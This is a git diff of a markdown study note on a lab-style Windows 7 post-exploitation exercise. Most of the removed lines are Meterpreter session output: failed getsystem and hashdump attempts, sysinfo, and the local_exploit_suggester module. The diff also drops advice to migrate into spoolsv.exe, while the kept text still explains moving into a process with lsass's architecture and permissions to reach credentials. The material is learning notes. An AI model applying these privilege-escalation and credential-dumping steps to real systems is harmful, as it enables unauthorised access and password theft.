@@ -128,47 +128,7 @@ https://darkstar7471.com/resources.html
 
 ## Adventure
 
-Steps
-- nmap -sC
-  - OS
-  - Computer name / hostname
-  - ...
-- https://www.cvedetails.com/
-
-![img.png](_images/img.png)
-
-meterpreter > getsystem
-[-] priv_elevate_getsystem: Operation failed: 691 The following was attempted:
-[-] Named Pipe Impersonation (In Memory/Admin)
-[-] Named Pipe Impersonation (Dropper/Admin)
-[-] Token Duplication (In Memory/Admin)
-[-] Named Pipe Impersonation (RPCSS variant)
-[-] Named Pipe Impersonation (PrintSpooler variant)
-[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
-
-sysinfo
-Computer        : XXX-PC
-OS              : Windows **7** (6.1 **Build 7601**, Service Pack 1).
-Architecture    : **x64** (used to determine what scripts you can use)
-System Language : en_US
-Domain          : WORKGROUP
-Logged On Users : 2
-Meterpreter     : x86/windows
-
-getuid
-Server username: XXX-PC\Dark
-
-hashdump
-[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
-
-While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`
-
-* sessions id (same as sessions -i id in the msf shell)
-* see your priviledges: getprivs
-
 Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. 
-
-The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service? spoolsv.exe
 
 In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass.
 
